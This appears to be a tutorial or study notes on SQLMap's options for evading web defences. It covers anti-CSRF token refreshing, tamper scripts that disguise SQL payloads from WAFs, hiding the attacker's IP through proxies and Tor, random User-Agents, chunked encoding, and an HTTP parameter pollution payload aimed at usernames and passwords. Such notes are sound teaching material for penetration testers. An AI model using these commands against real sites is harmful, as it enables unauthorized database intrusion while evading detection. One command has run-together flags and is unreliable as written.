## **Bypassing Web Application Protections**

**1. Anti-CSRF Token Bypass**

Many websites use Anti-CSRF (Cross-Site Request Forgery) tokens in HTTP requests.

- Each request must include a valid token.
- The token is available only after visiting the page.
- This prevents unauthorized requests and automation.

SQLMap can automatically update the token using `--csrf-token`.

```bash
sqlmap -u "http://www.example.com/" \
--data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" \
--csrf-token="csrf-token"
```

**2. Unique Value Bypass**

Some applications require a parameter to have a **different (unique) value** in every request.

Use:

```bash
--randomize=<parameter>
```

Example:

```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" \
--randomize=rp --batch -v 5
```

**3. Calculated Parameter Bypass**

Some applications calculate one parameter from another.

Example:

```
h = MD5(id)
```

Use:

```bash
--eval
```

Example:

```bash
sqlmap-u"http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" \--eval="import hashlib; h=hashlib.md5(id).hexdigest()" \--batch-v5
```

SQLMap runs the Python code before sending each request and calculates the correct hash.

**4. IP Address Concealing**

If your IP is blocked, use:

**Proxy**

```
--proxy="socks4://177.39.187.70:33283"
```

**Multiple Proxies**

```
--proxy-file=proxies.txt
```

SQLMap automatically switches to the next proxy if one fails.

**Tor**

```
--tor
```

SQLMap automatically looks for the local Tor SOCKS proxy (usually port **9050** or **9150**).

**Verify Tor is working:**

```
--check-tor
```

SQLMap checks **https://check.torproject.org/** and looks for the word:

```
Congratulations
```

**5. WAF Bypass**

SQLMap automatically checks for a Web Application Firewall (WAF). It sends a test payload using a fake parameter such as:

```
?pfov=...
```

If a WAF exists, the response changes. Example:

```
406 Not Acceptable
```

SQLMap uses the identYwaf library to identify 80 different WAFs. Skip WAF detection:

```
--skip-waf
```

**6. User-Agent Blacklisting Bypass**

Some servers block SQLMap's default User-Agent:

```
sqlmap/1.4.9
```

Use:

```
--random-agent
```

SQLMap selects a random browser User-Agent. **Note:** If one protection exists, others may also be enabled.

**7. Tamper Scripts**

Tamper scripts modify SQL payloads before sending them to bypass WAF/IPS protections. Example: `>` → `NOT BETWEEN ,`  , `=` → `BETWEEN`

This helps bypass simple filters.

Use:

```
--tamper=between,randomcase
```

Multiple tamper scripts can be chained. SQLMap runs them according to their predefined priority. Some tamper scripts change SQL syntax, while others modify only the payload formatting.

### Common Tamper Scripts

| Tamper Script | Description |
| --- | --- |
| `0eunion` | Replaces `UNION` with `e0UNION` |
| `base64encode` | Base64-encodes the payload |
| `between` | Replaces `>` with `NOT BETWEEN` and `=` with `BETWEEN` |
| `commalesslimit` | Converts `LIMIT M,N` → `LIMIT N OFFSET M` (MySQL) |
| `equaltolike` | Replaces `=` with `LIKE` |
| `halfversionedmorekeywords` | Adds MySQL versioned comments before each keyword |
| `modsecurityversioned` | Wraps the whole query in MySQL versioned comments |
| `modsecurityzeroversioned` | Wraps the query in MySQL zero-versioned comments |
| `percentage` | Adds `%` before every character (`SELECT` → `%S%E%L%E%C%T`) |
| `plus2concat` | Replaces `+` with `CONCAT()` (MSSQL) |
| `randomcase` | Randomizes keyword case (`SELECT` → `SEleCt`) |
| `space2comment` | Replaces spaces with comments (`/**/`) |
| `space2dash` | Replaces spaces with `--` + random string + newline |
| `space2hash` | Replaces spaces with `#` + random string + newline (MySQL) |
| `space2mssqlblank` | Replaces spaces with random valid blank characters (MSSQL) |
| `space2plus` | Replaces spaces with `+` |
| `space2randomblank` | Replaces spaces with random blank characters |
| `symboliclogical` | Replaces `AND`/`OR` with `&&`/` |
| `versionedkeywords` | Wraps non-function keywords with MySQL versioned comments |
| `versionedmorekeywords` | Wraps every keyword with MySQL versioned comments |

List all available tamper scripts:

```
--list-tampers
```

You can also create custom tamper scripts for specialized attacks (e.g., second-order SQLi).

**8. Miscellaneous Bypasses**

**Chunked Transfer Encoding**

Use:

```
--chunked
```

- Splits the POST body into chunks.
- SQL keywords are divided across chunks, helping bypass some filters.

**HTTP Parameter Pollution (HPP)**

Splits the payload across multiple parameters with the same name. Example:

```
?id=1
&id=UNION
&id=SELECT
&id=username,password
&id=FROM
&id=users
```

Some platforms (e.g., ASP) combine these parameters into one value, allowing the payload to work while bypassing certain filters.
